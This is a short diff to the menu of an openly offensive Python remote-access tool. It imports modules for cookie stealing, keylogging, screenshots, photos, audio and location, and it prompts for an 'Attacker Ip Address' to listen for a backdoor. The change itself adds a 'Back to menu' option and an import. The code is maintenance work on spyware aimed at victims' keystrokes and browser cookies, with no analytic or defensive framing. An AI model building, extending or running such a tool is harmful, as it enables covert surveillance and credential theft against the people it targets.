@@ -1,4 +1,6 @@
 import os
+
+import view
 from afterListen import find_loc, auido, cookie_steal, keylogger, photo, screenshoot
 import socket
 from colorama import Fore
@@ -12,10 +14,15 @@ def listen_other_server():
         "[05] Keylogger\n"
         "[06] Steal Cookie\n"
         "[07] Exit\n"
+        "[99] Back to menu\n"
     )   
     door_choose = int(input("=> "))
     if door_choose == 7:
         exit()
+
+    elif door_choose == 99:
+        view.view()
+
 
     try: #Listen backdoor
         host = input(f"=>{Fore.RED} Attacker Ip Address: ")
